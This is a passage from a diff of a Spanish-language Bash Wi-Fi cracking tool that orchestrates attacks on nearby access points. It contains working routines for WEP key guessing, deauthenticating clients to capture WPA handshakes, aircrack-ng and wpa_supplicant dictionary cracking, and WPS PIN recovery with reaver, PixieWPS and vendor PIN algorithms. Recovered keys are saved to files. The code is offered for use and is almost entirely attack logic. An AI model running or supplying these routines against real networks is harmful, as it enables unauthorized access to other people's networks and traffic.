+				
+				[ "$(iwconfig $IFACE|grep "Access Point: $BSSID")" ] && sleep 1 && return 0
+				
+				sleep 1
+				ESPERA=$(($ESPERA-1))
+			done
+			
+			N=$(($N+1))
+		done
+		
+		touch "$TMP/wlanreaver_no_asociado.txt"
+		return 1
+	}
+	
+	LanzarWlanreaver() {
+		
+		TOTAL_CLAVES="$(cat "$DICCIONARIOS/$BSSID.dic"|grep -cv "^$")"
+		N_CLAVE=0
+		INICIO=$(date +%s)
+		DATA=0
+		
+		while read CLAVE ; do
+			
+			N_CLAVE=$(($N_CLAVE+1))
+			SEGUNDOS=$(($(date +%s)-$INICIO))
+			TIEMPO=$(date -d "1970-01-01 $SEGUNDOS sec" +"%H:%M:%S")
+			[ $SEGUNDOS -gt 0 ] && CS=$(($N_CLAVE/$SEGUNDOS))
+			[ ! "$CS" ] && CS=0
+			
+			InfoObjetivo2
+			
+			echo
+			echo "[0;32m - Tiempo transcurrido:[0m $TIEMPO"
+			echo
+			echo "[0;32m - Probando clave:[0m $CLAVE"
+			echo
+			echo "[0;32m - Claves probadas:[0m $N_CLAVE/$TOTAL_CLAVES"
+			echo
+			echo "[0;32m - Velocidad:[0m $CS c/s"
+			
+			if [ ! "$(iwconfig $IFACE|grep "$BSSID")" ]; then
+				
+				echo
+				echo "[0;31m - Se ha perdido la conexión[0m"
+				
+				Asociacion
+				
+				if [ $? -ne 0 ]; then
+					
+					break
+				fi
+			fi
+			
+			if [ ${#CLAVE} = 5 ] || [ ${#CLAVE} = 13 ]; then
+				
+				iwconfig $IFACE key s:$CLAVE
+				
+			elif [ ${#CLAVE} = 10 ] || [ ${#CLAVE} = 26 ]; then
+				
+				iwconfig $IFACE key $CLAVE
+				
+			else
+				echo
+				echo "[0;31m - Clave no probada, longitud inválida.[0m"
+				
+				sleep 3
+			fi
+			
+			if [ "$(arping -c 2 -w 10000 -i $IFACE $GATEWAY|grep "index")" ]; then
+				
+				CLAVE_WEP="$CLAVE"
+				break
+			fi
+			
+		done <"$DICCIONARIOS/$BSSID.dic"
+	}
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		ResetInterface
+	fi
+	
+	if [ ! -f "$DICCIONARIOS/$BSSID.dic" ]; then
+		
+		echo
+		echo -n " - Generando diccionario... "
+		
+		CrearDiccionario >/dev/null 2>&1
+		
+		[ $? -eq 0 ] && echo "[0;32m√ [0m"||echo
+		sleep 3
+		Clear
+	fi
+	
+	unset CLAVE_WEP
+	rm -rf "$TMP/wlanreaver_detenido.txt" "$TMP/wlanreaver_no_asociado.txt"
+	trap "touch $TMP/wlanreaver_detenido.txt; break" SIGINT
+	
+	if [ "$(echo "$ESSID"|egrep -x "WLAN[[:xdigit:]]{6}|YACOM[[:xdigit:]]{6}|WiFi[[:xdigit:]]{6}")" ]; then
+		
+		SUBRED=2
+	else
+		SUBRED=1
+	fi
+	
+	GATEWAY="192.168.$SUBRED.1"
+	
+	InfoObjetivo2
+	Asociacion
+	
+	if [ $? -eq 0 ]; then
+		
+		LanzarWlanreaver
+	fi
+	
+	if [ -f "$TMP/wlanreaver_detenido.txt" ]; then
+		
+		rm -f "$TMP/wlanreaver_detenido.txt"
+		echo
+		echo "[0;31m - Se ha detenido el proceso[0m"
+		
+	elif [ -f "$TMP/wlanreaver_no_asociado.txt" ]; then
+		
+		rm -f "$TMP/wlanreaver_no_asociado.txt"
+		echo
+		echo "[0;31m - No ha sido posible asociarse al AP[0m"
+		
+	elif [ "$CLAVE_WEP" ]; then
+		
+		CLAVE_HEX="$(echo -n "$CLAVE"|od -A n -t x1|tr -d ' ')"
+		echo -e "ESSID: $ESSID \nBSSID: $BSSID \nCLAVE ${CIFRADO:0:3}: $CLAVE \nCLAVE HEX: $CLAVE_HEX\nKEYGEN: $KEYGEN" >"$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		sed -i 's/$/\r/' "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		echo
+		echo "[0;32m - Clave encontrada :)[0m"
+		echo
+		echo "[0;32m - La clave ha sido guardada en:[0m $CLAVES"
+	else
+		echo
+		echo "[0;31m - Clave no encontrada :([0m"
+	fi
+	
+	echo -n "[0;32m" && ResetInterface
+	
+	echo
+	echo "[0;32m - Presiona cualquier tecla para volver al menú principal[0m"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	MenuPrincipal
+}
+
+AtaqueAircrackWPA() {
+	
+	GuardarClave() {
+		
+		CLAVE="$(cat "$TMP/aircrack.txt"|grep "KEY FOUND\!"|tail -1|cut -d' ' -f4-|rev|cut -d' ' -f2-|rev)"
+		echo -e "ESSID: $ESSID \nBSSID: $BSSID \nCLAVE ${CIFRADO:0:3}: $CLAVE\nKEYGEN: $KEYGEN" >"$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		sed -i 's/$/\r/' "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		
+		echo
+		echo "[0;32m - Clave encontrada :)[0m"
+		echo
+		echo "[0;32m - La clave ha sido guardada en:[0m $CLAVES"
+	}
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ ! "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		MontarMonitor
+		sleep 3
+	fi
+	
+	Clear
+	rm -f "$DICCIONARIOS/$BSSID.dic" "$CAPTURAS/$BSSID"*csv "$CAPTURAS/$BSSID"*xml "$CAPTURAS/$BSSID"*cap "$TMP/"aireplay*.txt
+	killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1
+	trap "touch $TMP/AircrackWPA_detenido.txt; killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1; break" SIGINT
+	(airodump-ng $IFACE_MON -a --bssid $BSSID -c $CANAL -w "$CAPTURAS/$BSSID" >/dev/null 2>&1 &) 
+	while [ ! "$(pgrep "airodump-ng")" ] || [ ! -e "$CAPTURAS/$BSSID-01.csv" ]; do sleep 1; done
+	unset HANDSHAKE CLIENTES DICC AIRCRACK_INFO
+	INICIO=$(date +%s)
+	
+	N=0
+	while [ "$(pgrep "airodump-ng")" ]; do
+		
+		SEGUNDOS=$(($(date +%s)-$INICIO))
+		TIEMPO=$(date -d "1970-01-01 $SEGUNDOS sec" +"%H:%M:%S")
+		
+		InfoObjetivo1
+		
+		echo
+		echo "[0;32m - Tiempo transcurrido:[0m $TIEMPO"
+		
+		if [ "$CLIENTES" ] ; then
+			
+			[ $N -gt 0 ] && N=$(($N-1))
+			
+			if [ $N -eq 0 -a ! -f "$TMP/aireplay-0.txt" ]; then
+				
+				(DesautenticarClientes &)
+				N=40
+			fi
+			
+			echo
+			echo "[0;32m - Clientes encontrados:[0m $(echo -n "$CLIENTES"|tr '\n' ' ')"
+			
+			if [ -f "$TMP/aireplay-0.txt" ]; then
+				
+				echo
+				echo "[0;32m - Desautenticando clientes...[0m"
+			fi
+		else
+			echo
+			echo "[0;32m - Esperando clientes...[0m"
+		fi
+		
+		if [ ! "$HANDSHAKE" ]; then
+			
+			echo
+			echo "[0;32m - Esperando handshake...[0m"
+			
+			CLIENTES="$(grep "$BSSID" "$CAPTURAS/$BSSID-01.csv"|egrep -v "^$BSSID|not associated"|awk -F ',' '{print $1}')"
+			[ $DATA -ne 0 ] && HANDSHAKE="$(aircrack-ng "$CAPTURAS/$BSSID-01.cap" 2>/dev/null|grep "1 handshake")"
+			
+		else
+			
+			if [ ! -f "$DICCIONARIOS/$BSSID.dic" ]; then
+				
+				echo
+				echo -n "[0;32m - Generando diccionario...[0m "
+				
+				CrearDiccionario >/dev/null 2>&1
+				
+				[ $? -eq 0 ] && echo "[0;32m√ [0m"||echo
+			fi
+			
+			echo
+			echo "[0;32m - Lanzando Aircrack-ng con diccionario...[0m"
+			aircrack-ng -K -b $BSSID -w "$DICCIONARIOS/$BSSID.dic" "$CAPTURAS/$BSSID-01.cap" >"$TMP/aircrack.txt" 2>&1
+			
+			if [ "$(tac "$TMP/aircrack.txt"|grep -m1 "KEY FOUND")" ]; then
+				
+				GuardarClave
+				break
+			else
+				echo
+				echo "[0;31m - Clave no encontrada :([0m"
+				echo
+				sleep 3
+				break
+			fi
+			
+			rm -f "$TMP/aircrack.txt"
+		fi
+		
+		sleep 0.5
+	done
+	
+	if [ -f "$TMP/AircrackWPA_detenido.txt" ]; then
+		
+		rm -f "$TMP/AircrackWPA_detenido.txt"
+		
+		echo
+		echo "[0;31m - Se ha detenido el proceso[0m"
+	fi
+	
+	echo
+	echo "[0;32m - Presiona cualquier tecla para volver al menú principal[0m"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1
+	MenuPrincipal
+}
+
+AtaqueAirlin() {
+	
+	##################################################################
+	#
+	# Ataque de diccionario a redes con cifrado WPA sin modo monitor
+	# Escrito en bash por geminis_demon
+	# Idea original por Warcry
+	#
+	##################################################################
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		ResetInterface
+	fi
+	
+	if [ ! -f "$DICCIONARIOS/$BSSID.dic" ]; then
+		
+		echo
+		echo -n " - Generando diccionario... "
+		
+		CrearDiccionario >/dev/null 2>&1
+		[ $? -eq 0 ] && echo "[0;32m√ [0m"||echo
+		sleep 3
+		Clear
+	fi
+	
+	unset CLAVE_WPA
+	killall wpa_supplicant >/dev/null 2>&1
+	rm -f "$TMP/wpa_supplicant.txt" "$TMP/wpa_supplicant.conf" "$TMP/airlin_stop.txt" "$TMP/airlin_detenido.txt"
+	trap "touch $TMP/airlin_stop.txt; touch $TMP/airlin_detenido.txt; killall wpa_supplicant >/dev/null 2>&1" SIGINT
+	
+	(while read CLAVE; do
+		
+		if [ -f "$TMP/airlin_stop.txt" ]; then
+			
+			rm -f "$TMP/airlin_stop.txt"
+			break
+		fi
+		
+		echo "" >"$TMP/wpa_supplicant.txt"
+		wpa_passphrase "$ESSID" "$CLAVE" >"$TMP/wpa_supplicant.conf"
+		wpa_supplicant -i "$IFACE" -D wext -c "$TMP/wpa_supplicant.conf" -f "$TMP/wpa_supplicant.txt" -P "$TMP/wpa_supplicant.pid"
+		
+	done <"$DICCIONARIOS/$BSSID.dic") & AIRLIN_PID=$!
+	
+	sleep 1
+	TOTAL_CLAVES="$(cat "$DICCIONARIOS/$BSSID.dic"|grep -cv "^$")"
+	INICIO=$(date +%s)
+	N_CLAVE=0
+	
+	while [ -e "/proc/$AIRLIN_PID" ]; do
+		
+		SEGUNDOS=$(($(date +%s)-$INICIO))
+		TIEMPO=$(date -d "1970-01-01 $SEGUNDOS sec" +"%H:%M:%S")
+		
+		PSK="$(grep "#psk=" "$TMP/wpa_supplicant.conf"|tr '"' ' '|awk '{print $2}')"
+		
+		WPASUPPLICANT="$(sed 's/^/ /' "$TMP/wpa_supplicant.txt"|grep -v "^$"|tail -8|head -8)"
+		while [ $(echo "$WPASUPPLICANT"|wc -l) -lt 8 ]; do WPASUPPLICANT="$(echo -e "$WPASUPPLICANT\n ")"; done
+		
+		InfoObjetivo2
+		
+		echo " $WPASUPPLICANT"
+		echo " ----------------------------------------------------------------------"
+		echo
+		echo "[0;32m - Tiempo transcurrido:[0m $TIEMPO"
+		echo
+		echo "[0;32m - Probando clave:[0m $PSK"
+		echo
+		echo "[0;32m - Claves probadas:[0m $N_CLAVE/$TOTAL_CLAVES"
+		
+		if [ "$PSK_" != "$PSK" ]; then
+			
+			N_CLAVE=$(($N_CLAVE+1))
+		fi
+		
+		PSK_="$PSK"
+		
+		if [ "$(echo "$WPASUPPLICANT"|grep "negotiation completed")" ]; then
+			
+			CLAVE_WPA="$PSK"
+			touch "$TMP/airlin_stop.txt"
+			killall wpa_supplicant >/dev/null 2>&1
+			break
+			
+		elif [ "$(echo "$WPASUPPLICANT"|grep "Handshake failed")" ]; then
+			
+			killall wpa_supplicant >/dev/null 2>&1
+		fi
+		
+		sleep 0.5
+	done
+	
+	if [ -f "$TMP/airlin_detenido.txt" ]; then
+		
+		rm -f "$TMP/airlin_detenido.txt"
+		
+		echo
+		echo "[0;31m - Se ha detenido el proceso[0m"
+		
+	elif [ "$CLAVE_WPA" ]; then
+		
+		CLAVE="$CLAVE_WPA"
+		echo -e "ESSID: $ESSID \nBSSID: $BSSID \nCLAVE ${CIFRADO:0:3}: $CLAVE\nKEYGEN: $KEYGEN" >"$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		sed -i 's/$/\r/' "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		
+		echo
+		echo "[0;32m - Clave encontrada :)[0m"
+		echo
+		echo "[0;32m - La clave ha sido guardada en:[0m $CLAVES"
+	else
+		echo
+		echo "[0;31m - Clave no encontrada :([0m"
+	fi
+	
+	killall wpa_supplicant >/dev/null 2>&1
+	echo -n "[0;32m" && ResetInterface
+	
+	echo
+	echo "[0;32m - Presiona cualquier tecla para volver al menú principal[0m"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	MenuPrincipal
+}
+
+AtaqueReaver() {
+	
+	LanzarReaver() {
+		
+		if [ ! "$G1" ]; then
+			
+			if [ -f "$SESIONES/$(echo "$BSSID"|tr -d ':').wpc" ]; then
+				
+				mv "$SESIONES/$(echo "$BSSID"|tr -d ':').wpc" "$RUTA_REAVER/$(echo "$BSSID"|tr -d ':').wpc"
+			else
+				rm -f "$RUTA_REAVER/$(echo "$BSSID"|tr -d ':').wpc"
+			fi
+		fi
+		
+		killall $REAVER >/dev/null 2>&1
+		("$REAVER" -i $IFACE_MON -b $BSSID -c $CANAL -a -n $PG -T 1 -t 10 $G1 $PX -vv -o "$TMP/reaver.txt" 1>"$TMP/reaver1.txt" 2>"$TMP/reaver2.txt" &)
+		sleep 1
+		REAVER_PID=$(pgrep "$(basename "$REAVER")")
+		trap "touch $TMP/reaver_detenido.txt; kill -s INT $REAVER_PID >/dev/null 2>&1; killall pixiewps 2>/dev/null" SIGINT
+		tail -F "$TMP/reaver.txt" --pid=$REAVER_PID
+		unset PX
+		CLAVE="$(tail "$TMP/reaver.txt"|grep "WPA PSK:"|cut -d"'" -f2-|rev|cut -d"'" -f2-|rev)"
+		
+		if [ ! "$G1" ]; then
+			
+			if [ -f "$RUTA_REAVER/$(echo "$BSSID"|tr -d ':').wpc" ]; then
+				
+				cp "$RUTA_REAVER/$(echo "$BSSID"|tr -d ':').wpc" "$SESIONES/$(echo "$BSSID"|tr -d ':').wpc"
+			fi
+		fi
+		
+		if [ ! "$CLAVE" ]; then
+			
+			if [ "$(tail "$TMP/reaver.txt"|grep "Quitting after 1")" ]; then
+				
+				echo  "[-] [0;31mPIN incorrecto[0m"
+				
+				sleep 2
+				
+			elif [ -f "$TMP/reaver_detenido.txt" ]; then
+				
+				rm -f $TMP/reaver_detenido.txt
+				
+				echo
+				echo "[0;31m - El proceso se ha detenido[0m"
+				echo
+				
+				sleep 3
+				MenuPrincipal
+			else
+				if [ "$1" != "NoProblem" ]; then
+					
+					echo
+					echo "[0;31m - Se ha producido un error desconocido[0m"
+					echo
+					
+					sleep 3
+					MenuPrincipal
+				fi
+			fi
+		fi
+	}
+	
+	ProbarPinGenerico() {
+		
+		[ ! "$PIN_GENERICO" ] && PIN_GENERICO="12345670"
+		X=0
+		Y=$(echo "$PIN_GENERICO"|tr ' ' '\n'|wc -l)
+		
+		for PINWPS in $PIN_GENERICO; do
+			
+			X=$(($X+1))
+			PX="-p $PINWPS"
+			
+			echo
+			echo "[0;32m - Probando con PIN genérico $X/$Y... [0m(Ctrl+C para detener)"
+			echo
+			
+			LanzarReaver
+			[ "$CLAVE" ] && break
+		done
+	}
+	
+	ProbarComputePIN() {
+		
+		ComputePIN
+		PX="-p $PINWPS"
+		
+		echo
+		echo "[0;32m - Probando con algoritmo ComputePIN 1/1... [0m(Ctrl+C para detener)"
+		echo
+		
+		LanzarReaver
+	}
+	
+	ProbarEasyboxWPS() {
+		
+		EasyboxWPS
+		PX="-p $PINWPS"
+		
+		echo
+		echo "[0;32m - Probando con algoritmo EasyboxWPS 1/1... [0m(Ctrl+C para detener)"
+		echo
+		
+		LanzarReaver
+	}
+	
+	ProbarFTE_Keygen() {
+		
+		FTE_Keygen
+		PX="-p $PINWPS"
+		
+		echo
+		echo "[0;32m - Probando con algoritmo FTE_Keygen 1/1... [0m(Ctrl+C para detener)"
+		echo
+		
+		LanzarReaver
+	}
+	
+	ProbarDlinkPingen() {
+		
+		NIC="$(echo $BSSID|cut -d':' -f4-|tr -d ':')" #6 últimos dígitos sin puntos
+		NIC=$((0x$NIC)) #Convertir a decimal
+		NIC=$(($NIC+1)) #Sumar +1
+		NIC=$(printf "%X\n" $NIC) #Convertir a hexadecimal
+		PIN_MAC="$(dlink_pingen.py $NIC|cut -d' ' -f3)"
+		PIN_BSSID="$(dlink_pingen.py $BSSID|cut -d' ' -f3)"
+		X=0
+		
+		for PINWPS in $PIN_MAC $PIN_BSSID; do
+			
+			X=$(($X+1))
+			PX="-p $PINWPS"
+			
+			echo
+			echo "[0;32m - Probando con algoritmo DlinkPingen $X/2... [0m(Ctrl+C para detener)"
+			echo
+			
+			LanzarReaver
+			[ "$CLAVE" ] && break
+		done
+	}
+	
+	ProbarPixieWPS() {
+		
+		ObtenerPIN() {
+			
+			killall pixiewps 2>/dev/null
+			pixiewps -e $PKE -r $PKR -s $EHASH1 -z $EHASH2 -a $AUTHKEY -n $ENONCE $FORCE >"$TMP/pixiewps.txt" 2>"$TMP/pixiewps2.txt"
+			PINWPS="$(cat "$TMP/pixiewps.txt"|egrep -o "pin:    [0-9]{8}"|awk '{print $2}')"
+		}
+		
+		echo
+		echo "[0;32m - Probando con algoritmo PixieWPS 1/1... [0m(Ctrl+C para detener)"
+		echo
+		
+		unset PKE PKR EHASH1 EHASH2 AUTHKEY ENONCE PINWPS
+		rm -f "$TMP/reaver1.txt"
+		PG="-F -G"
+		LanzarReaver NoProblem
+		PG="-P -G"
+		
+		while read LINE; do
+			
+			[ "$(echo "$LINE"|grep "PKe: ")" ] && PKE="$(echo "$LINE"|cut -d' ' -f2-)" && unset PKR EHASH1 EHASH2 AUTHKEY ENONCE
+			[ "$(echo "$LINE"|grep "PKr: ")" ] && PKR="$(echo "$LINE"|cut -d' ' -f2-)"
+			[ "$(echo "$LINE"|grep "E-Hash1: ")" ] && EHASH1="$(echo "$LINE"|cut -d' ' -f2-)"
+			[ "$(echo "$LINE"|grep "E-Hash2: ")" ] && EHASH2="$(echo "$LINE"|cut -d' ' -f2-)"
+			[ "$(echo "$LINE"|grep "AuthKey: ")" ] && AUTHKEY="$(echo "$LINE"|cut -d' ' -f2-)"
+			[ "$(echo "$LINE"|grep "E-Nonce: ")" ] && ENONCE="$(echo "$LINE"|cut -d' ' -f2-)"
+			[ "$PKE" ] && [ "$PKR" ] && [ "$EHASH1" ] && [ "$EHASH2" ] && [ "$AUTHKEY" ] && [ "$ENONCE" ] && break
+			
+		done <"$TMP/reaver1.txt" 2>/dev/null
+		
+		echo
+		cat "$TMP/reaver1.txt"|grep "^- "|head -5
+		echo
+		
+		unset FORCE
+		ObtenerPIN
+		
+		if [ ! "$PINWPS" ]; then
+			
+			echo  "[0;31m - Ataque fallido[0m"
+			echo
+			echo "[0;32m - Reintentando con el parámetro --force...[0m"
+			echo
+			echo "[0;32m - Esto puede tardar mas de 30 minutos[0m"
+			
+			sleep 2
+			FORCE="--force"
+			ObtenerPIN
+			
+			echo
+			echo "[0;32m - Tiempo empleado:[0m $(cat "$TMP/pixiewps.txt"|grep "Time taken:"|cut -d' ' -f5-)"
+			echo
+			
+		fi
+		
+		if [ ! "$PINWPS" ]; then
+			
+			echo  "[0;31m - Ataque fallido[0m"
+			
+			return 1
+		else
+			PX="-p $PINWPS"
+			LanzarReaver
+		fi
+	}
+	
+	ProbarBelkinPingen() {
+		
+		SERIAL="$(cat "$TMP/reaver1.txt" 2>/dev/null|grep "^- Numero de serie"|cut -d':' -f2-|sed 's/^ //')"
+		[ ! "$SERIAL" ] && return 1
+		PINWPS="$(belkin_pingen "${BSSID//:}" "$SERIAL" 2>/dev/null|cut -d' ' -f3)"
+		[ ! "$PINWPS" ] && return 1
+		PX="-p $PINWPS"
+		
+		echo
+		echo "[0;32m - Probando con algoritmo BelkinPingen 1/1... [0m(Ctrl+C para detener)"
+		echo
+		
+		LanzarReaver
+	}
+	
+	ProbarTRENDnetWPS() {
+		
+		TRENDnetWPS
+		PX="-p $PINWPS"
+		
+		echo
+		echo "[0;32m - Probando con algoritmo TRENDnetWPS 1/1... [0m(Ctrl+C para detener)"
+		echo
+		
+		LanzarReaver
+	}
+	
+	FuerzaBruta() {
+		
+		if [ "${BSSID:0:8}" = "8C:0C:A3" ]; then 
+			
+			REAVER="reavermod"
+			RUTA_REAVER="/usr/local/etc/reavermod"
+			unset PG
+		fi
+		
+		unset G1 PX
+		
+		echo
+		echo "[0;32m - Probando todos los posibles PINes... [0m(Ctrl+C para detener)"
+		echo
+		
+		LanzarReaver
+	}
+	
+	REAVER="reaver_pixie"
+	RUTA_REAVER="/etc/reaver"
+	PG="-P -G"
+	G1="-g 1"
+	
+	unset CLAVE PINWPS PX
+	
+	if [ -e "$SESIONES/$(echo "$BSSID"|tr -d ':').wpc" ]; then
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		
+		SELECT=1
+		GUARDAR=0
+		while [ $GUARDAR -eq 0 ]; do
+			
+			unset RESALTAR
+			RESALTAR[$SELECT]="[48;5;21m"
+			Clear
+			Cabecera
+			
+			echo
+			echo " [0;32m - Existe una sesión de reaver guardada[0m"
+			echo
+			echo " ${RESALTAR[1]}▶ Retomar la sesión guardada[0m"
+			echo
+			echo " ${RESALTAR[2]}▶ Eliminar sesión y empezar de nuevo[0m"
+			echo
+			echo " ${RESALTAR[3]}◀ Volver al menú anterior[0m"
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				
+				case "$TECLA" in
+					
+					$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+					$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 3 ] && SELECT=$(($SELECT+1)); break;;
+					$'\e[D'|a|A) SeleccionarAtaque; break;;
+				     ''|$'\e[C'|d|D)
+						
+						case $SELECT in
+							
+							1) 
+								GUARDAR=1
+								SESION=1
+								break
+							;;
+							
+							2) 
+								GUARDAR=1
+								rm -f "$RUTA_REAVER/$(echo "$BSSID"|tr -d ':').wpc"
+								rm -f "$SESIONES/$(echo "$BSSID"|tr -d ':').wpc"
+								SESION=0
+								break
+							;;
+							
+							3) 
+								GUARDAR=1
+								SeleccionarAtaque
+								break
+							;;
+						esac
+					;; 
+				esac
+			done
+		done
+	else
+		SESION=0
+	fi
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ ! "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		MontarMonitor
+		sleep 3
+	fi
+	
+	Clear
+	ifconfig "$IFACE" up &>/dev/null
+	
+	case $KEYGEN in 
+		
+		PINGENERICO ) ProbarPinGenerico;;
+		ComputePIN ) ProbarComputePIN;;
+		PixieWPS ) ProbarPixieWPS;;
+		EasyboxWPS ) ProbarEasyboxWPS;;
+		DlinkPingen ) ProbarDlinkPingen;;
+		BelkinPingen ) ProbarBelkinPingen;;
+		TRENDnetWPS ) ProbarTRENDnetWPS;;
+		FTE_Keygen ) ProbarFTE_Keygen;;
+		*)
+			if [ $SESION -eq 0 ]; then
+				
+				KEYGEN="PixieWPS" && ProbarPixieWPS
+				[ ! "$CLAVE" ] && [ "$(echo "$KEYGEN_WPS"|grep "^FTE_Keygen")" ] && KEYGEN="FTE_Keygen" && ProbarFTE_Keygen
+				[ ! "$CLAVE" ] && KEYGEN="PINGENERICO" && ProbarPinGenerico
+				[ ! "$CLAVE" ] && KEYGEN="ComputePIN" && ProbarComputePIN
+				[ ! "$CLAVE" ] && KEYGEN="EasyboxWPS" && ProbarEasyboxWPS
+				[ ! "$CLAVE" ] && KEYGEN="DlinkPingen" && ProbarDlinkPingen
+				[ ! "$CLAVE" ] && KEYGEN="BelkinPingen" && ProbarBelkinPingen
+				[ ! "$CLAVE" ] && unset KEYGEN && FuerzaBruta
+			else
+				FuerzaBruta
+			fi
+		;;
+	esac
+	
+	if [ "$CLAVE" ]; then
+		
+		PIN="$(tail "$TMP/reaver.txt"|grep "WPS PIN:"|cut -d"'" -f2-|rev|cut -d"'" -f2-|rev)"
+		echo -e "ESSID: $ESSID \nBSSID: $BSSID \nPIN WPS: $PIN \nCLAVE ${CIFRADO:0:3}: $CLAVE\nKEYGEN: $KEYGEN">"$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		sed -i 's/$/\r/' "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		
+		echo
+		echo "[0;32m - Clave encontrada :)[0m"
+		echo
+		echo "[0;32m - La clave ha sido guardada en:[0m $CLAVES"
+		
+	else
+		echo
+		echo "[0;31m - Clave no encontrada :([0m"
+	fi
+	
+	echo
+	echo "[0;32m - Presiona cualquier tecla para volver al menú principal[0m"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	MenuPrincipal
+}
+
+CrearDiccionario() {
+	
+	case $KEYGEN in
+		
+		wlandecrypter )
+			
+			if [ "$SOPORTADA_WEPWPA" = "SI" ]; then
+				
+				wlandecrypter $BSSID "$ESSID"|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+			else
+				if [ "$(wlandecrypter -l|grep "${BSSID:0:8}")" ]; then
+					
+					wlandecrypter $BSSID "WLAN_??"|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+				else
+					wlandecrypter -a "$ESSID"|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+				fi
+			fi
+		;;
+		
+		jazzteldecrypter )
+			
+			if [ "$SOPORTADA_WEPWPA" = "SI" ]; then
+				
+				jazzteldecrypter $BSSID "$ESSID"|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+			else
+				if [ "$(jazzteldecrypter -l|grep "${BSSID:0:8}")" ]; then
+					
+					jazzteldecrypter $BSSID "WLAN_??"|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+				else
+					jazzteldecrypter -a "$ESSID"|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+				fi
+			fi
+		;;
+		
+		wpamagickey )
+			
+			if [ "$SOPORTADA_WEPWPA" = "SI" ]; then
+				
+				wpamagickey "$ESSID" $BSSID|tail +7|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+			else
+				wpamagickey NOESSID $BSSID|tail +7|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+			fi
+		;;
+		
+		ono4xx )
+			
+			ono4xx "$ESSID" $BSSID ${CIFRADO:0:3}|tail +8|egrep -v "Proceso|^$" >"$DICCIONARIOS/$BSSID.dic"
+		;;
+		
+		wlan4xx )
+			
+			wlan4xx "$ESSID" $BSSID 2>/dev/null|tail +4|egrep -v "Proceso|^$" >"$DICCIONARIOS/$BSSID.dic"
+		;;
+		
+		dlinkdecrypter.sh )
+			
+			dlinkdecrypter.sh $BSSID /dev/stdout|tail +2|awk '{print $3}'|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+		;;
+		
+		stkeys )
+			
+			OCTEOS="$(echo "$ESSID"|rev|cut -c 1-6|rev)"
+			stkeys -i "$OCTEOS" -o "$DICCIONARIOS/$BSSID.dic" >/dev/null
+		;;
+		
+		PTV_Keygen )
+			
+			PTV_Keygen|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+		;;
+		
+		EasyboxWPS )
+			
+			EasyboxWPS
+			echo "$WPA"|grep -v "^$" >"$DICCIONARIOS/$BSSID.dic"
+		;;
+		
+		belkin4xx.py )
+			
+			belkin4xx.py -b $BSSID -e "$ESSID" -a|tail +2 >"$DICCIONARIOS/$BSSID.dic"
+		;;
+		
+		wifiarnet.py )
+			
+			wifiarnet.py -b $BSSID|grep "WPA key"|cut -d' ' -f5 >"$DICCIONARIOS/$BSSID.dic"
+		;;
+		
+		sitecom.py )
+			
+			sitecom.py -b $BSSID >"$DICCIONARIOS/$BSSID.dic"
+		;;
+	esac
+}
+
+SeleccionarAtaque() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	if [ ! "$BSSID" ]; then
+		
+		echo
+		echo  "[0;31m - No se ha seleccionado ningún objetivo, no se puede continuar[0m"
+		sleep 3
+		MenuPrincipal
+	fi
+	
+	(
+		if [ "${CIFRADO:0:3}" = "WEP" ]; then
+			
+			if [ "$KEYGEN_WEPWPA" ]; then
+				
+				echo "$KEYGEN_WEPWPA"|while read KEYGEN VULNERABLE; do
+					
+					if [ "$VULNERABLE" = "OK" ]; then
+						
+						VULNERABLE="[0;42mVULNERABLE[0m"
+						
+					elif [ "$VULNERABLE" = "¿?" ]; then
+						
+						VULNERABLE="[0;43mVULNERABLE?[0m"
+					else
+						unset VULNERABLE
+					fi
+					
+					echo "▶ Ataque Aircrack-NG (WEP) + algoritmo $KEYGEN[0m $VULNERABLE|AtaqueAircrackWEP|$KEYGEN"
